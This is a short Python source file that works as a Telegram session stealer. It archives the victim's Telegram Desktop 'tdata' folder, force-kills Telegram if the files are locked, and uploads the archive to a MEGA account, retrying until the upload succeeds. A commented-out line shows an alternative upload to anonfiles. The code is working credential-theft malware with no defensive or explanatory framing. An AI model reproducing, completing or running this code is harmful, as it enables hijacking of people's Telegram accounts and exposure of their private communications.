from shutil import make_archive 
from os import chdir , path , environ , system , getenv
from time import sleep
from requests import post
from mega import Mega
class MainfinTelegram:
    def __init__(self):
        self.name = getenv("Computername")
        self.paths = path.join(environ["USERPROFILE"],"AppData","Roaming","Telegram Desktop")
    def ar(self):
        chdir(self.paths)
        make_archive(f"{self.name}", "zip" , "tdata")
    def urlpars(self,email,password):
        chdir(self.paths)
        self.Mega_up.login(email=email,password=password)
        self.Mega_up.upload(f'{self.name}.zip')
        #files = {'file': (f'{self.name}.zip', open(f"{self.name}.zip", 'rb'))}
        #url = f'https://api.anonfiles.com/upload?token={str(token)}'
        #post(url, files=files)

class TER:
    def __init__(sefl):
        pass 
    def telegramm(self , email,password):
        telg = MainfinTelegram()
        while 1:
            try:
                telg.ar()
            except PermissionError:
                system("taskkill /IM Telegram.exe /F")
                telg.ar()
            try:
                telg.urlpars(email,password)
                break
            except Exception as e:
                pass
